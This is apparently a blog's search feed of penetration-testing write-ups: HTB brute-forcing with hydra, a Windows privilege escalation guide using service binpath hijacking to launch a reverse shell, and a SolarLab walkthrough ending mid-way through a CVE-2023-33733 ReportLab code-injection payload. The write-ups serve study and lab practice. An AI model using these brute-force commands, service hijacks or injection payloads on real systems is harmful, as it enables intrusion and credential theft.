<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HTB Academy - Login Brute Forcing Skill Assessment II  Walkthrough</title>
      <link href="/2025/06/19/HTB%20Skill%20Assessment%20II%20Walkthrough/"/>
      <url>/2025/06/19/HTB%20Skill%20Assessment%20II%20Walkthrough/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://academy.hackthebox.com/storage/modules/57/logo.png" alt="htblogo"></h2><p> The assessment’s objective is to  brute force  both SSH &amp; FTP servers on the target.<br> we start by gathering the  username for the SSH server   from skill Assessment I’s solution, which I’m not allowed to spoil.<br>lets start by brute forcing that user’s SSH password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l &lt;username&gt; -P &lt;2023-200_most_used_passwords.txt&gt; &lt;ip&gt; -s &lt;port&gt; ssh -t 3 -I</span><br></pre></td></tr></table></figure><p>SSH into target</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh &lt;user&gt;@83.136.253.201 -p &lt;port&gt;</span><br><span class="line">#prompt for pass:&lt;pass&gt;</span><br></pre></td></tr></table></figure><p>open incident report, There should be  a username hint<br><img src="/../images/bruting/namehint.png" alt="namehint"><br> use <code>username-anarchy</code> tool on the discovered user to generate a  list of possible ftp username combinations:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./username-anarchy/username-anarchy [FIRST] [LAST] &gt; tsmithNames.txt</span><br></pre></td></tr></table></figure><p>brute ftp with the newly generated username list and the provided password list on the target.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L &lt;unarchyLIST.txt&gt;.txt -P passwords.txt 127.0.0.1 ftp -t 3 -I</span><br></pre></td></tr></table></figure><p><img src="/../images/bruting/ftphydra.png" alt="ftphydra"><br>login to ftp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ftp ftp://&lt;USERNAME&gt;:&quot;&lt;PASS&gt;&quot;@localhost</span><br></pre></td></tr></table></figure><p>download the flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">ftp&gt; get flag.txt</span><br><span class="line">ftp&gt; exit</span><br><span class="line">sshSession$ cat flag.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> nmap </tag>
            
            <tag> bruteforcing </tag>
            
            <tag> brute </tag>
            
            <tag> hydra </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox Cicada  Walkthrough</title>
      <link href="/2025/01/22/HTB-SolarLab%20copy/"/>
      <url>/2025/01/22/HTB-SolarLab%20copy/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/solarlab/.png" alt="alt text"></p><hr><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1> <span id="more"></span><hr><table><thead><tr><th>INFO</th><th></th></tr></thead><tbody><tr><td>CTF NAME</td><td><strong>Cicada</strong></td></tr><tr><td>Operating System</td><td><strong>Windows</strong></td></tr><tr><td>Diffculty</td><td><strong>Medium</strong></td></tr><tr><td>Retire date</td><td>21 Sep 2024</td></tr><tr><td>Points</td><td><strong>35</strong></td></tr></tbody></table><hr><h1 id="INFORMATION-GATHERING"><a href="#INFORMATION-GATHERING" class="headerlink" title="INFORMATION GATHERING"></a>INFORMATION GATHERING</h1><h1 id="ENUMERATION"><a href="#ENUMERATION" class="headerlink" title="ENUMERATION"></a>ENUMERATION</h1><p>En</p>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> nmap </tag>
            
            <tag> HTB </tag>
            
            <tag> smb </tag>
            
            <tag> windows </tag>
            
            <tag> flask </tag>
            
            <tag> privilege escalation </tag>
            
            <tag> openfire </tag>
            
            <tag> chisel </tag>
            
            <tag> password-spray </tag>
            
            <tag> htb Cicada </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Privilege Escalation Blueprint</title>
      <link href="/2024/11/03/Privilege%20Escalation/"/>
      <url>/2024/11/03/Privilege%20Escalation/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/priv-esc-win/image.png" alt="h1"></p><hr><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>In this guide, I’ll walk you through essential Windows privilege escalation techniques, covering various methods from kernel exploits to application misconfigurations. We’ll start by setting up our lab environment and tools, then dive into specific methods for escalation, I’ll also include a list of checks for each section.</p> <span id="more"></span><hr><h2 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h2><ul><li><p><a href="#introduction">Introduction</a></p></li><li><p><a href="#lab-setup-and-tools">Lab Setup and Tools</a></p></li><li><p><a href="#privilege-escalation-tools">Privilege Escalation Tools</a></p></li><li><p><a href="#kernel-and-service-exploits">Kernel Exploits</a></p></li><li><p><a href="#kernel-and-service-exploits">Service Exploits</a></p></li><li><p><a href="#registry">Registry</a></p></li><li><p><a href="#passwords">Passwords</a></p></li><li><p><a href="#scheduled-tasks">Scheduled Tasks</a></p></li><li><p><a href="#insecure-gui-applications">Insecure GUI Applications</a></p></li><li><p><a href="#installed-applications">Installed Applications</a></p></li><li><p><a href="#port-forwarding">Port Forwarding</a></p></li><li><p><a href="#startup-applications">Startup Applications</a></p></li><li><p><a href="#conclusion">Conclusion</a></p><hr></li></ul><h2 id="Lab-Setup-and-Tools"><a href="#Lab-Setup-and-Tools" class="headerlink" title="Lab Setup and Tools"></a>Lab Setup and Tools</h2><hr><p>For this guide, I’m using a virtual environment with Kali Linux as the attack machine and Windows 10 as the target machine. environment is configured with default security settings and  Windows defender was disabled to focus on learning the techniques. </p><p>List of tools used:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe          juicypotato.zip  Procmon64.exe  SharpUp.exe</span><br><span class="line">CreateShortcut.vbs     plink.exe        PsExec64.exe   winPEASany.exe</span><br><span class="line">cve-2018-8120-x64.exe  potato.exe       Seatbelt.exe</span><br><span class="line">JuicyPotato.exe        PowerUp.ps1      setup.bat</span><br></pre></td></tr></table></figure><p>Transfering tools over to the victim:<br>in order to move the files to our target we will use SMB.</p><p>enable smb on windows so we can transfer the tools<br><img src="/../images/priv-esc-win/smve.png" alt="alt text"></p><p>start  SMB server on Kali:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python /usr/share/doc/python3-impacket/examples/smbserver.py tools .</span><br></pre></td></tr></table></figure><p>start a reverse shell on Windows instead of having to use the gui</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp C:/Users/vboxuser/Desktop/</span><br><span class="line">\\<span class="number">192</span>.<span class="number">168</span>.<span class="number">5</span>.<span class="number">4</span>\tools\reverse.exe</span><br></pre></td></tr></table></figure><hr><h2 id="Windows-Access-Control-and-Privileges"><a href="#Windows-Access-Control-and-Privileges" class="headerlink" title="Windows Access Control and Privileges"></a>Windows Access Control and Privileges</h2><hr><h3 id="User-Accounts"><a href="#User-Accounts" class="headerlink" title="User Accounts"></a>User Accounts</h3><p>Think of a user account as a collection of settings &#x2F; preferences<br>bound to a unique identity.<br>The local “Administrator” account is created by default at<br>installation.</p><h3 id="SERVICE-ACCOUNTS"><a href="#SERVICE-ACCOUNTS" class="headerlink" title="SERVICE ACCOUNTS"></a>SERVICE ACCOUNTS</h3><p>Service accounts are (somewhat obviously) used to run services<br>in Windows.<br>Service accounts cannot be used to sign into a Windows system.<br>&#x3D;&#x3D;The SYSTEM account is a default service account which has the&#x3D;&#x3D;<br>&#x3D;&#x3D;highest privileges&#x3D;&#x3D; of any local account in Windows.<br>Other default service accounts include NETWORK SERVICE and<br>LOCAL SERVICE.</p><h3 id="Groups"><a href="#Groups" class="headerlink" title="Groups"></a>Groups</h3><p>Pseudo groups (e.g. “Authenticated Users”) have a dynamic list of<br>members which changes based on certain interactions.</p><h3 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h3><p>In Windows, there are multiple types of resource (also known as objects):<br>• Files &#x2F; Directories<br>• Registry Entries<br>• Services</p><p>Whether a user or a group has permission to perform a certain action<br>on a resource depends on that resource’s access control list (ACL).</p><hr><h3 id="ACLs-ACEs"><a href="#ACLs-ACEs" class="headerlink" title="ACLs &amp; ACEs"></a>ACLs &amp; ACEs</h3><hr><p><img src="/../images/priv-esc-win/1.png" alt="alt text"></p><p>Permissions to access a certain resource in Windows are controlled by the access control list (ACL) for that resource. Each ACL is made up of zero or more access control entries (ACEs).<br>Each ACE defines the relationship between a principal (e.g. a<br>user, group) and a certain access right.</p><hr><h2 id="Kernel-Exploits"><a href="#Kernel-Exploits" class="headerlink" title="Kernel Exploits"></a>Kernel Exploits</h2><hr><p>Kernel exploits allow you to escalate privileges by taking advantage of vulnerabilities in the system’s core processes or services. This section explores common kernel and service vulnerabilities and methods to exploit them.<br>The kernel has complete control over the operating system. Think of it as a layer between application software and the actual computer hardware Exploiting a kernel vulnerability can result in execution as the <code>SYSTEM</code> user.</p><p>Finding and using kernel exploits is usually a simple process:</p><ol><li>Enumerate Windows version &#x2F; patch level <code>(systeminfo)</code>.</li><li>Find matching exploits (Google, ExploitDB, GitHub)MS.</li><li>Compile and run</li></ol><hr><h2 id="Enumerating-the-environment"><a href="#Enumerating-the-environment" class="headerlink" title="Enumerating the environment"></a>Enumerating the environment</h2><hr><ul><li>Windows Exploit Suggester:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bitsadmin/wesng</span><br></pre></td></tr></table></figure><p>you need to feed it the systeminfo output</p><p>run this from windows terminal: </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo &gt; sysinfo.txt</span><br></pre></td></tr></table></figure><p>run the Windows exploit suggester:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> &gt; wes sysinfo.txt -i &#x27;Elevation</span><br><span class="line">of Privilege&#x27; --exploits-only | less</span><br></pre></td></tr></table></figure><p><img src="/../images/priv-esc-win/wes.png" alt="alt text"></p><p>so now that we hopefully enumerated the kernal version using wes lets look for Precompiled Kernel Exploits:<br><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br>Unfourtently for me i wasn’t able to get any exploits as the machine i was testing was fully patched. if you found though, you can look up the exploit and try it for priv esc.</p><hr><h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a><strong>Services</strong></h2><hr><p>services act as background programs, executing some regular tasks. if services are misconfigured and are running with system privileges, you can exploit them to run commands with system privileges too. Each service has an ACL which defines service-specific Permissions.<br>Some permissions are not useful for our intetions (e.g. <code>SERVICE_QUERY_CONFIG</code>,<br><code>SERVICE_QUERY_STATUS</code>).<br>Some may be useful (e.g. <code>SERVICE_STOP</code>, <code>SERVICE_START</code>).<br>Some are dangerous (e.g. <code>SERVICE_CHANGE_CONFIG</code>,<code>SERVICE_ALL_ACCESS</code>)<br>Common Service Misconfigurations:</p><ul><li>Insecure properties</li><li>unquoted Service Path</li><li>Weak Registry Permissions</li><li>Insecure Service executables</li><li>DLL hijacking</li></ul><p><strong>Insecure Service permissions</strong></p><ul><li>if a user has permission to change the configuration of a service which runs with system privileges, we can change the executable the services uses to one of our own.</li><li>you need to be able to start&#x2F;stop the service.</li></ul><p><img src="/../images/priv-esc-win/winpeas-service.png" alt="alt text"></p><p>Let’s find out more details about the service<br>querying for service info:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; sc qc daclsvc</span><br></pre></td></tr></table></figure><p>![[HTB&#x2F;CPTS&#x2F;offensive security&#x2F;Screenshots&#x2F;images&#x2F;images 1&#x2F;Pasted image 20240811150127.png]]</p><p><code>START_TYPE: DEMAD_START</code> means this server starts manually also, the service runs with <strong>system permissions</strong>.<br>querying for service status</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc query daclsvc</span><br></pre></td></tr></table></figure><p>![[HTB&#x2F;CPTS&#x2F;offensive security&#x2F;Screenshots&#x2F;images&#x2F;images 1&#x2F;Pasted image 20240811150657.png]]<br><strong>Changing  configuration</strong>:<br>so now that we we know that the service config is modifiable, we’re able to tamper with the config to set the binary path of the service to our own executable <code>reverseshell.exe</code> and start the service.<br>Tools is located at <code>C:\Users\user\Desktop\tools</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config daclsvc binpath= &quot;\&quot;C:\Users\user\Desktop\tools\reverse.exe\&quot;&quot;</span><br></pre></td></tr></table></figure><p>Confirming the new config.<br>![[HTB&#x2F;CPTS&#x2F;offensive security&#x2F;Screenshots&#x2F;images&#x2F;images 1&#x2F;Pasted image 20240811151453.png]]<br>Now you can start a <code>nc</code> listener and <code>net start daclsvc</code> to get a shell using this technique .</p><p>*<strong>Modifiable services</strong><br>after running <code>winPEAS.exe queit serviceinfo</code> to enumerate services information<br>we can find that the<code>daclsvc</code>  properties can be modified.<br><strong>Accesschk flags</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Services:    -uwqcv user &lt;svc-name&gt;</span><br><span class="line">Files:       -quvw</span><br><span class="line">Directories: -uwdq</span><br><span class="line">Registries:  -uvwqk</span><br></pre></td></tr></table></figure><hr><h4 id="Service-permission-Checklist"><a href="#Service-permission-Checklist" class="headerlink" title="Service permission Checklist:"></a>Service permission Checklist:</h4><hr><p>**Checks for insecure service permission:</p><ul><li><input disabled="" type="checkbox"> you ran <strong>Winpeas</strong> and it highlighted  that you can modify a service.</li><li><input disabled="" type="checkbox"> You are able to interact with services (Eg. Query config)</li><li><input disabled="" type="checkbox"> You confirmed your current user’s permissions to service with **accescheck</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk /accepteula -uwcqv &lt;loggedin-user&gt; &lt;svc-name&gt;</span><br></pre></td></tr></table></figure><p>The follow checks are also related to accesschk:</p><ul><li><input disabled="" type="checkbox"> you can modify configuration of a service <code>SERVICE_CHANGE_CONFIG</code></li><li><input disabled="" type="checkbox"> You can start the service <code>SERVICE_START</code></li><li><input disabled="" type="checkbox"> The service is run with the permission of system or higher privilege user <code>SERVICE_START_NAME</code> Attributes</li></ul><hr><p><strong>Checks for unquoted Service Path</strong>:</p><ul><li><input disabled="" type="checkbox"> you ran <strong>Winpeas</strong> and it found that a service had unquoted path.</li><li><input disabled="" type="checkbox"> You ran accesschk  <code>-ucqv</code> to see if you have <code>SERVICE_START</code> permission.</li><li><input disabled="" type="checkbox"> You ran acceschk on each directory in the path to binary  <code>-uwdq  &lt;possible-dir&gt;</code></li></ul><hr><p><strong>Checks for Weak Registry Permissions</strong></p><ul><li><input disabled="" type="checkbox"> WINPEAS Output</li><li><input disabled="" type="checkbox"> Verify registry permission with powershell or acesschk</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Acl</span> &lt;REGISTERY<span class="literal">-ENTRY-PATH</span>&gt; | <span class="built_in">Format-List</span></span><br><span class="line"></span><br><span class="line">accesschk.exe /accepteula <span class="literal">-uvwqk</span> &lt;registery path&gt;</span><br></pre></td></tr></table></figure><ul><li><input disabled="" type="checkbox"> Check for <code>start/stop </code> permission <code> accesschk /accepteula -ucqv user &lt;svc&gt;</code></li><li><input disabled="" type="checkbox"> Query registry info <code>reg query &lt;regPath&gt;</code></li><li><input disabled="" type="checkbox"> Override registry values using <code>reg add </code></li></ul><hr><p><strong>Checks for insecure file permissions (Replaceable exe)</strong>:</p><ul><li><input disabled="" type="checkbox"> WINPEAS Output</li><li><input disabled="" type="checkbox"> Access check with <code>-quvw</code> and <code>uvqc</code> on the <code>exe</code> file</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /Y &lt;pathtoshell&gt; &quot;&lt;path-to-exe&gt;&quot;</span><br></pre></td></tr></table></figure><hr><h2 id="Passwords"><a href="#Passwords" class="headerlink" title="Passwords"></a>Passwords</h2><hr><p>In this section, we look at methods to locate and exploit weak or hardcoded passwords on a system. Tools like <code>mimikatz</code> can be particularly useful for this.</p><p><strong>![Image Placeholder: Password Extraction]</strong></p><hr><h2 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h2><hr><p>The Windows Registry stores configuration settings, some of which may be misconfigured in a way that allows privilege escalation. Here’s what to look for in the registry and how to leverage any insecure settings.</p><p><strong>![Image Placeholder: Registry Exploitation Steps]</strong></p><hr><h2 id="Insecure-GUI-Applications"><a href="#Insecure-GUI-Applications" class="headerlink" title="Insecure GUI Applications"></a>Insecure GUI Applications</h2><hr><p>GUI applications that run with elevated privileges but have insecure settings can be exploited to execute arbitrary code. This section covers how to identify and take advantage of these applications.</p><p><strong>![Image Placeholder: GUI Application Exploitation]</strong></p><hr><h2 id="Scheduled-Tasks"><a href="#Scheduled-Tasks" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h2><hr><p>Misconfigured scheduled tasks may allow an attacker to replace executables or scripts with their own. This section explains how to find and exploit such tasks for privilege escalation.</p><p><strong>![Image Placeholder: Scheduled Task Exploitation Steps]</strong></p><hr><h2 id="Installed-Applications"><a href="#Installed-Applications" class="headerlink" title="Installed Applications"></a>Installed Applications</h2><hr><p>Improperly configured installed applications can present opportunities for privilege escalation. Here, we’ll cover common misconfigurations in applications that can be exploited.</p><p><strong>![Image Placeholder: Application Misconfiguration Exploitation]</strong></p><hr><h2 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h2><hr><p>If network restrictions are blocking your path, port forwarding can help bypass them. Learn how to use port forwarding to create new attack vectors in restricted environments.</p><p><strong>![Image Placeholder: Port Forwarding Example]</strong></p><hr><h2 id="Startup-Applications"><a href="#Startup-Applications" class="headerlink" title="Startup Applications"></a>Startup Applications</h2><hr><p>Applications set to run at startup, especially those with elevated privileges, may be vulnerable to exploitation. Here’s how to check for these applications and leverage any vulnerabilities.</p><p><strong>![Image Placeholder: Startup Application Exploitation]</strong></p><hr><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><hr><p>Privilege escalation is a critical skill in penetration testing, and mastering these techniques gives you powerful insight into system security. This guide covers various practical methods, from kernel exploits to startup applications, ensuring you have a solid toolkit for real-world scenarios. Always remember to test responsibly!</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> privesc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox SolarLab  Walkthrough</title>
      <link href="/2024/09/22/HTB-SolarLab/"/>
      <url>/2024/09/22/HTB-SolarLab/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/solarlab/blacksolar.png" alt="alt text"></p><hr><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>SolarLab begins with an SMB share containing a spreadsheet of usernames and passwords. By exploiting a website that displays distinct error messages for incorrect usernames versus wrong passwords, combined with analyzing the username format, I was able to identify valid credentials.</p><p> Once logged in, I leveraged CVE-2023-33733 in the reportlab PDF generation process to achieve Remote Code Execution (RCE) and obtain a shell.</p><p>For lateral movement,  to escalate privileges to the openfire user,  method takes advantage of CVE-2023-32315 in OpenFire to create a user and upload a malicious plugin for RCE.<br> With this access, I decrypted a password from the OpenFire configuration, which  served as the administrator’s password. </p> <span id="more"></span><hr><table><thead><tr><th>INFO</th><th></th></tr></thead><tbody><tr><td>CTF NAME</td><td><strong>SolarLab</strong></td></tr><tr><td>Operating System</td><td><strong>Windows</strong></td></tr><tr><td>Diffculty</td><td><strong>Medium</strong></td></tr><tr><td>Retire date</td><td>21 Sep 2024</td></tr><tr><td>Points</td><td><strong>35</strong></td></tr></tbody></table><hr><h1 id="INFORMATION-GATHERING"><a href="#INFORMATION-GATHERING" class="headerlink" title="INFORMATION GATHERING"></a>INFORMATION GATHERING</h1><p>Initial nmap scan with default scripts</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sV  -oN nmap/solarlab_full 10.10.11.16 -p-</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-16 14:54 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.16</span><br><span class="line">Host is up (0.094s latency).</span><br><span class="line">Not shown: 65529 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">6791/tcp open  hnm</span><br><span class="line">7680/tcp open  pando-pub</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-05-17T18:56:05</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 87.15 seconds</span><br></pre></td></tr></table></figure><p>Fingerprinting OS using smbmap would indicate the machine is a windows server 2019.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H solarlab.htb -v</span><br></pre></td></tr></table></figure><h1 id="ENUMERATION"><a href="#ENUMERATION" class="headerlink" title="ENUMERATION"></a>ENUMERATION</h1><p>Enumerating the discovered SMB service, there was one share with a document file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smb -H 10.10.11.16 -s Documents -u guest -r</span><br><span class="line">[+]                                                   </span><br><span class="line">        Documents                                               READ ONLY</span><br><span class="line">        fr--r--r--            12793 Fri Nov 17 07:34:54 2023    details-file.xlsx</span><br><span class="line">-----------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>download the  file</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap  -H 10.10.11.16 -s Documents -u guest -p &quot;&quot; -r -A  details-file.xlsx  </span><br></pre></td></tr></table></figure><p><img src="/../images/solarlab/image-1.png" alt="alt text"><br> it was clear that these were some login credentials related to a domain</p><p>Nothing else was discovered on SMB. its time to enumerate port 80.</p><h2 id="Enumerating-Port-80"><a href="#Enumerating-Port-80" class="headerlink" title="Enumerating  Port 80"></a>Enumerating  Port 80</h2><p>The default root appeared to be a static site with nothing interesting, so I started looking at other open ports and discovered a subdomain running on port 6791:<br><code>http://report.solarlab.htb:6971</code><br><img src="/../images/solarlab/report-lab.png" alt="alt text"><br>I initially started by identifying which users from the spreadsheet existed. Testing h usernames like “blake.byte” or “blake byte” produced a different error messages from “claudiaS” or “alexanderK”, confirming that Alex and Claudia exist but the passwords were incorrect.</p><h3 id="bruteforcing-with-intruder"><a href="#bruteforcing-with-intruder" class="headerlink" title="bruteforcing with intruder"></a>bruteforcing with intruder</h3><p>I attempted bruteforcing in Clusterbomb attack mode, trying different combinations from the spreadsheet file.<br><img src="/../images/solarlab/intruder.png" alt="alt text"><br>No valid credentials, I returned to the document and observed a pattern in the naming convention. Two users had shortened names, e.g., ClaudiaS and AlexanderK. The third user, Blake Byte, could follow the same pattern.<br>Trying the same brute attack with “blakeB” as the login username worked:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* PASS: ThisCanB3typedeasily1@</span><br><span class="line">* USER: blakeb</span><br></pre></td></tr></table></figure><h2 id="Enumerating-Reporthub"><a href="#Enumerating-Reporthub" class="headerlink" title="Enumerating Reporthub"></a>Enumerating Reporthub</h2><p>This site offers some functionality, and the “Training Request” section leads to a form.<br><img src="/../images/solarlab/reporthub.webp" alt="asas"></p><p><img src="/../images/solarlab/form.png" alt="alt text"><br>After clicking the “Generate PDF” button, I was redirected to a PDF document. The image gets reflected in the PDF, indicating a possible XSS vulnerability.<br><img src="/../images/solarlab/signature.png" alt="alt text"><br>I tried simple payloads to test for injection, uploading script files with .html and .svg formats, but no luck. I then downloaded the PDF document and ran exiftool on it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">exiftool output.pdf </span><br><span class="line">ExifTool Version Number         : 12.40</span><br><span class="line">File Name                       : output.pdf</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 202 KiB</span><br><span class="line">File Modification Date/Time     : 2024:09:12 15:54:21-04:00</span><br><span class="line">File Access Date/Time           : 2024:09:12 15:54:22-04:00</span><br><span class="line">File Inode Change Date/Time     : 2024:09:12 15:54:21-04:00</span><br><span class="line">File Permissions                : -rwxrwx---</span><br><span class="line">File Type                       : PDF</span><br><span class="line">File Type Extension             : pdf</span><br><span class="line">MIME Type                       : application/pdf</span><br><span class="line">PDF Version                     : 1.4</span><br><span class="line">Linearized                      : No</span><br><span class="line">Author                          : (anonymous)</span><br><span class="line">Create Date                     : 2024:05:17 22:53:02-02:00</span><br><span class="line">Creator                         : (unspecified)</span><br><span class="line">Modify Date                     : 2024:05:17 22:53:02-02:00</span><br><span class="line">Producer                        : ReportLab PDF Library - www.reportlab.com</span><br><span class="line">Subject                         : (unspecified)</span><br><span class="line">Title                           : (anonymous)</span><br><span class="line">Trapped                         : False</span><br><span class="line">Page Mode                       : UseNone</span><br><span class="line">Page Count                      : 1</span><br></pre></td></tr></table></figure><p>The library used to make it is ReportLab.</p><p>Searching for “reportlab exploit” turns up information about CVE-2023-33733, a remote code execution vulnerability through Injection in ReportLab:<br><img src="/../images/solarlab/cve.png" alt="alt text"></p><h2 id="Exploiting-ReportLab"><a href="#Exploiting-ReportLab" class="headerlink" title="Exploiting ReportLab"></a>Exploiting ReportLab</h2><p>Navigating to the exploit PoC on GitHub, the exploit code was:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">para</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;[[[getattr(pow, Word(&#x27;__globals__&#x27;))</span></span></span><br><span class="line"><span class="string"><span class="tag">[&#x27;os&#x27;].system(&#x27;ping #attacker-ip&#x27;) for Word in [ orgTypeFun( &#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1,</span></span></span><br><span class="line"><span class="string"><span class="tag"> &#x27;startswith&#x27;: lambda self,</span></span></span><br><span class="line"><span class="string"><span class="tag">  x: 1 == 0, &#x27;__eq__&#x27;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123; setattr(self, &#x27;mutated&#x27;, self.mutated - 1) &#125;, &#x27;__hash__&#x27;: lambda self: hash(str(self)), &#125;, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 